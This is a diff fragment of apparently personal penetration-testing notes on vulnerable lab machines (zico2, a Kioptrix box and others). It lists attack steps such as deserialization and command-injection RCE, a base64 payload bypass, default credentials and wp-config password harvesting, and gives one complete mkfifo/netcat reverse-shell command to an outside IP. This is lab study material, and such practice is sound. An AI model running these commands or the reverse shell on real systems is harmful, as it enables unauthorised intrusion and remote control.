@@ -125,3 +125,5 @@ json unsearialize vuln of webapplication, rce; ps -aux to find process is runnin
   sqli like hackme1; c coded , input box, system("id"), indicates developed by C; system(base64_decode("payload") to bypass cannot type blank); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.129 8821 >/tmp/f (nc for revershell cannot user -e);
 #### zico2
   phpLiteAdmin v1.9.3 default passwd admin; exploit  Remote PHP Code Injection to get a shell; enumerate zico home folder/wp-config get host passwd; sudo -l
+#### kiopreix2
+  web page ping app with python reverse shell toget a shell;kernel vuln
